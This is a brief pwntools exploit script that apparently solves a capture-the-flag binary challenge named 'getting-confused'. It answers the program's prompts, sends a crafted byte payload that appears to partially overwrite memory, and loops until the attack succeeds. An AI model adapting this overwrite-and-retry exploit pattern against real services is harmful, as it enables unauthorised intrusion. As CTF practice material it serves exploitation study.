from pwn import *


binpath = './getting-confused'

elf = ELF(binpath)

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = 'DEBUG'


gdbscript = '''
gef

# b main
# last fgets
b *(0x0000555555554000+0x1394)
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = gdb.debug([binpath], aslr=True, gdbscript=gdbscript)
# io = process(binpath)

def solve():
    io.recvline()
    io.sendline(b'howdy\n')

    io.recvline()
    io.sendline(b"gig 'em\n")

    io.recvline()

    payload = b''
    payload += b'whoop'
    payload += b'\x80\x60\n'

    io.send(payload)
    return io.recvline()


if __name__ == '__main__':
    i = 0
    while True:
        print(i)
        # io = remote('localhost', 4088)
        io = process(binpath)
        try:
            data = solve()
            if b'Begone' not in data:
                print(data)
                break
        except EOFError:
            break
            continue
        io.close()
